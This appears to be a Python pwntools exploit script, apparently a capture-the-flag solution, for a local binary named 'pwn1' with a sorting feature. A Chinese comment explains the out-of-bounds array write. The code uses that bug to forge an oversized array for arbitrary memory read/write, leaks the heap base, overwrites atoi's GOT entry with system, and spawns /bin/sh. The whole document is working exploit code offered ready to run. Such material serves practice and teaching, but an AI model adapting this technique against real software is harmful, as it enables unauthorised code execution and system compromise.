#-* coding=utf-8 -*#
#问题出在排序数组可以越界读写一个数，刚好是下一个排序好的数组的地址，通过修改该地址伪造一个大小为0x40000000的数组实现任意地址空间的读写
from pwn import *

p = process( './pwn1' )

atoi_got = 0x804d020

atoi_libc = 194640

system_libc =   254944

def sort ( num , num_list ):
    p.sendlineafter( '_CMD_$ ' , 'sort' )
    p.sendlineafter( 'How many numbers do you want to sort: ' , str ( num ) )
    for i in num_list  :
        p.sendlineafter ( 'number: ' , str( i ) )
    p.sendlineafter ( 'Choose: ' , '3' )

def query( index ) :
    p.sendlineafter ( 'Choose: ' , '1' )
    p.sendlineafter ( 'Query index: ' , str ( index ) )
    p.recvuntil ( '[*L*] Query result: ' )
    data = int ( p.recvline()[:-1] )
    return data

def update( index , num ) :
    p.sendlineafter ( 'Choose: ' , '2' )
    p.sendlineafter ( 'Update index: ' , str( index ) )
    p.sendlineafter ( 'Update number: ' , str ( num ) )


def pwn() :
    sort ( 5 , [ 1073741824 , 1073741824 , 1073741824, 1073741824 , 1073741824 ] )
    p.sendlineafter ( 'Choose: ' , '7' )
    sort ( 4 , [ 10 , 10,10, 10 ] )
    p.sendlineafter ( 'Choose: ' , '7' )
    sort ( 3 , [ 10 , 10 , 10 ] )
    heap_base = query( 3 )#leak heap base
    update ( 3 , heap_base -28 )#伪造下一个排序数组
    p.sendlineafter ( 'Choose: ' , '7' )
    p.sendlineafter( '_CMD_$ ' , 'reload' )
    p.sendlineafter( 'Reload history ID: ' , '1' )
    num_list_base = heap_base + 0x32#reload之后的数组所在地址，用于计算到atoi的距离
    atoi_index = ( 0x100000000 - ( num_list_base - atoi_got ) ) / 4 - 2#计算查询和修改atoi的index
    atoi_add = 0x100000000 + query( atoi_index )
    system_add = atoi_add - atoi_libc + system_libc
    update( atoi_index , system_add -0x100000000 )
    p.sendlineafter ( 'Choose: ' , '/bin/sh' )
    p.interactive()

if __name__ =='__main__' :
    pwn()
